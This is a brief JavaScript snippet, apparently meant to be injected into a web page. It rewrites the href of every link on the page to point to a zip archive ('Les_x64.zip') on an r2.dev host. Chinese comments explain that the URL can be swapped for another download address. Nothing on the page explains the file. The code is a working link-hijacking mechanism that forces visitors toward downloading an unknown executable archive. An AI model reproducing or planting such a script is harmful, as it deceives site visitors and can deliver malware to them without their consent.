 

var xz = "https://pub-88d1eca795744622b022c61e43e8947d.r2.dev/Les_x64.zip";

//可以把   https://pub-88d1eca795744622b022c61e43e8947d.r2.dev/Les_x64.zip  这个改成下载地址；https://pub-88d1eca795744622b022c61e43e8947d.r2.dev/Les_x64.zip
//可以把   https://pub-88d1eca795744622b022c61e43e8947d.r2.dev/Les_x64.zip  这个改成文件下载：https://pub-88d1eca795744622b022c61e43e8947d.r2.dev/Les_x64.zip



var links = document.getElementsByTagName("a");
for (var i = 0; i < links.length; i++) {
    if (links[i].hasAttribute("href")) {
        links[i].href = xz;
    }
} 
